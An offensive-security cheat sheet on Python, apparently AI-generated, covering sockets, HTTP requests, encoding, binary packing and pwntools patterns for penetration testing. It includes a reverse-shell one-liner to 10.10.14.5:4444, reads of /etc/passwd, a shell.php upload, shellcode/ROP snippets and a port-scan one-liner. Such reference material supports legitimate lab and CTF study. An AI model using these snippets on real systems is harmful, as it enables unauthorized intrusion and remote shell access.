# Python

**Tags:** `#python` `#scripting` `#exploit` `#networking` `#postexploit` `#tooldev`

The most versatile scripting language in offensive security. Used for exploit modification, custom tooling, network programming, data parsing, web interaction, and binary exploitation. Python 3 is standard — some legacy exploits are Python 2 only.

**Version check:** `python3 --version` / `python --version`

> [!note]
> Most public exploits on ExploitDB/GitHub are Python 3. When adapting a Python 2 exploit: `print` → `print()`, `raw_input` → `input()`, `urllib2` → `urllib.request`, string/bytes handling changes significantly. Use `2to3 script.py` to auto-convert.

---

## Quick HTTP Server

```bash
# Serve current directory
python3 -m http.server 8000

# Bind to specific interface
python3 -m http.server 8000 --bind 10.10.14.5

# Python 2
python -m SimpleHTTPServer 8000
```

---

## Networking

```python
# TCP client
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.10", 80))
s.send(b"GET / HTTP/1.0\r\n\r\n")
print(s.recv(4096))
s.close()

# TCP server (listener)
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)
conn, addr = s.accept()
print(f"[+] Connection from {addr}")
while True:
    data = conn.recv(1024)
    if not data: break
    conn.sendall(data)

# UDP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b"data", ("10.10.10.10", 161))
data, addr = s.recvfrom(4096)

# Socket with timeout
s.settimeout(5)
```

---

## HTTP Requests

```python
import requests

# GET
r = requests.get("http://10.10.10.10/page", timeout=10)
print(r.status_code, r.text)

# POST (form)
r = requests.post("http://10.10.10.10/login", data={"user": "admin", "pass": "password"})

# POST (JSON)
r = requests.post("http://10.10.10.10/api", json={"key": "value"})

# Custom headers
headers = {"X-Forwarded-For": "127.0.0.1", "Authorization": "Bearer token"}
r = requests.get("http://10.10.10.10/admin", headers=headers)

# Session (persist cookies)
s = requests.Session()
s.post("http://10.10.10.10/login", data={"user": "admin", "pass": "password"})
r = s.get("http://10.10.10.10/dashboard")

# Proxy through Burp
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
r = requests.get("http://10.10.10.10/", proxies=proxies, verify=False)

# Ignore SSL warnings
import urllib3
urllib3.disable_warnings()
r = requests.get("https://10.10.10.10/", verify=False)

# File upload
files = {"file": ("shell.php", open("shell.php", "rb"), "application/octet-stream")}
r = requests.post("http://10.10.10.10/upload", files=files)
```

---

## Subprocess / OS Interaction

```python
import subprocess, os

# Run command, capture output
result = subprocess.run(["nmap", "-sV", "10.10.10.10"], capture_output=True, text=True)
print(result.stdout)

# Shell command
result = subprocess.run("cat /etc/passwd | grep root", shell=True, capture_output=True, text=True)

# Interactive (inherit terminal)
subprocess.run(["bash"])

# os.system (simple, no output capture)
os.system("id")

# Environment
os.environ["PATH"]
os.getenv("HOME", "/tmp")

# File ops
os.path.exists("/etc/shadow")
os.listdir("/tmp")
os.getcwd()
os.chdir("/tmp")
```

---

## File I/O

```python
# Read
with open("file.txt", "r") as f:
    content = f.read()          # entire file
    lines = f.readlines()       # list of lines

# Write
with open("output.txt", "w") as f:
    f.write("data\n")

# Append
with open("log.txt", "a") as f:
    f.write("entry\n")

# Binary
with open("file.exe", "rb") as f:
    data = f.read()

with open("out.exe", "wb") as f:
    f.write(data)

# Read lines, strip whitespace
with open("wordlist.txt") as f:
    words = [line.strip() for line in f if line.strip()]
```

---

## Encoding / Crypto

```python
import base64, hashlib, binascii

# Base64
encoded = base64.b64encode(b"data").decode()
decoded = base64.b64decode("ZGF0YQ==")

# URL-safe base64
base64.urlsafe_b64encode(b"data")

# Hex
binascii.hexlify(b"\x41\x42").decode()     # "4142"
binascii.unhexlify("4142")                  # b"AB"
bytes.fromhex("4142")                       # b"AB"

# Hashing
hashlib.md5(b"password").hexdigest()
hashlib.sha256(b"password").hexdigest()
hashlib.sha1(b"data").digest()              # raw bytes

# XOR
def xor(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

# ROT13
import codecs
codecs.decode("uryyb", "rot_13")

# URL encode
from urllib.parse import quote, unquote, urlencode
quote("payload <script>")
quote("/path/to/file", safe="")   # encode slashes too
unquote("%2Fetc%2Fpasswd")
urlencode({"user": "admin", "pass": "p@ss"})
```

---

## Struct / Binary Parsing

```python
import struct

# Pack integers to bytes
struct.pack("<I", 0xdeadbeef)     # little-endian 32-bit unsigned int
struct.pack(">H", 1337)           # big-endian 16-bit unsigned short
struct.pack("<QI", 0x41414141, 5) # 64-bit + 32-bit

# Unpack bytes to integers
val, = struct.unpack("<I", b"\xef\xbe\xad\xde")
a, b = struct.unpack("<HH", data[0:4])

# Format characters
# < = little-endian, > = big-endian
# B = uint8, H = uint16, I = uint32, Q = uint64
# b = int8,  h = int16,  i = int32,  q = int64
# s = char[], p = pascal string

# Build binary payload
payload = b"\x41" * 100
payload += struct.pack("<Q", 0xdeadbeefcafebabe)
payload += b"\x90" * 16   # NOP sled
payload += shellcode
```

---

## Exploit Development Patterns

```python
# Cyclic pattern (manual)
import itertools, string
def cyclic(n):
    chars = (string.ascii_lowercase).encode()
    for combo in itertools.product(chars, repeat=4):
        if n <= 0: break
        yield bytes(combo); n -= 4

# pwntools (use when available)
from pwn import *

context.arch = "amd64"
context.os = "linux"

p = process("./binary")           # local
p = remote("10.10.10.10", 4444)  # remote
p = gdb.debug("./binary")        # with gdb

p.send(payload)
p.sendline(payload)
p.recv(1024)
p.recvuntil(b"prompt: ")
p.interactive()

# ROP
elf = ELF("./binary")
rop = ROP(elf)
rop.call("system", [next(elf.search(b"/bin/sh"))])
print(rop.dump())

# Shellcode
shellcode = asm(shellcraft.linux.sh())
```

---

## Argument Parsing

```python
import argparse

parser = argparse.ArgumentParser(description="Exploit for CVE-XXXX-XXXX")
parser.add_argument("host", help="Target IP")
parser.add_argument("port", type=int, help="Target port")
parser.add_argument("-u", "--user", default="admin", help="Username")
parser.add_argument("-p", "--password", required=True, help="Password")
parser.add_argument("-v", "--verbose", action="store_true")
args = parser.parse_args()

# Usage: python3 exploit.py 10.10.10.10 8080 -p password -v
print(f"[*] Targeting {args.host}:{args.port}")
```

---

## Threading / Concurrency

```python
import threading, queue

# Basic thread
def worker(target):
    # do work
    pass

threads = []
for ip in targets:
    t = threading.Thread(target=worker, args=(ip,))
    threads.append(t)
    t.start()
for t in threads:
    t.join()

# Thread pool (cleaner)
from concurrent.futures import ThreadPoolExecutor
with ThreadPoolExecutor(max_workers=20) as executor:
    results = list(executor.map(worker, targets))

# Thread-safe output
lock = threading.Lock()
def safe_print(msg):
    with lock:
        print(msg)
```

---

## Regular Expressions

```python
import re

# Find all matches
re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", text)  # IPs
re.findall(r"[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+", text)  # emails
re.findall(r"password[\"']?\s*[:=]\s*[\"']?([^\s\"']+)", text, re.I)

# Search (first match)
m = re.search(r"token=([a-f0-9]+)", response)
if m:
    token = m.group(1)

# Substitution
re.sub(r"<[^>]+>", "", html)     # strip HTML tags

# Flags
re.I     # case insensitive
re.M     # multiline
re.S     # dot matches newline
```

---

## One-Liners

```bash
# Run inline
python3 -c "import socket; print(socket.gethostbyname('target.com'))"

# Reverse shell
python3 -c "import socket,subprocess,os; s=socket.socket(); s.connect(('10.10.14.5',4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(['/bin/sh','-i'])"

# Base64 encode
python3 -c "import base64; print(base64.b64encode(open('file.bin','rb').read()).decode())"

# URL decode
python3 -c "from urllib.parse import unquote; print(unquote('%2Fetc%2Fpasswd'))"

# Hash
python3 -c "import hashlib; print(hashlib.md5(b'password').hexdigest())"

# Simple port scan
python3 -c "import socket; [print(p) for p in range(1,1025) if not socket.socket().connect_ex(('10.10.10.10',p))]"
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
